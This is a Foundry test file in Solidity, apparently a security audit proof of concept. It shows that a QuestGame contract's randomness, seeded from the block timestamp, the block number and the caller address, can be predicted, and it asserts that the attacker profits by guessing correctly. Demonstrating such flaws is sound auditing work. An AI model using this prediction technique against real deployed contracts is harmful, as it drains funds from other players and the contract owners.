
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {QuestGame} from "../src/QuestGame.sol";

contract TestWeakRandomnessQuestGame is Test {
    QuestGame game;
    address attacker = address(0xBEEF);

    function setUp() public {
        vm.deal(attacker, 10 ether);
        game = new QuestGame{value: 10 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        // --- 1. Constraints ---
        // Ensure timestamp is within a reasonable range and non-zero
        vm.assume(blockTimestamp > 0 && blockTimestamp < type(uint64).max);
        // Ensure block number is non-zero and reasonable
        vm.assume(blockNumber > 0 && blockNumber < type(uint64).max);

        // --- 2. State Configuration ---
        // Ensure attacker has enough ether (already done in setUp)

        // --- 3. Manipulate Block Environment ---
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        // --- 4. Predict the outcome (replicate contract logic) ---
        uint256 seed = uint256(
            keccak256(
                abi.encodePacked(
                    block.timestamp,
                    block.number,
                    attacker
                )
            )
        );
        uint256 predictedNumber = seed % 100;

        // --- 5. Execute with our predicted guess ---
        uint256 balanceBefore = attacker.balance;
        game.attemptQuest{value: game.ENTRY_FEE()}(predictedNumber);

        // --- 6. Assert predictability and successful exploitation ---
        // Attacker should receive the reward minus entry fee (net +0.1 ether)
        uint256 balanceAfter = attacker.balance;
        assertEq(
            balanceAfter,
            balanceBefore - game.ENTRY_FEE() + game.REWARD(),
            "Attacker should profit by predicting the random number"
        );

        vm.stopPrank();
    }
}
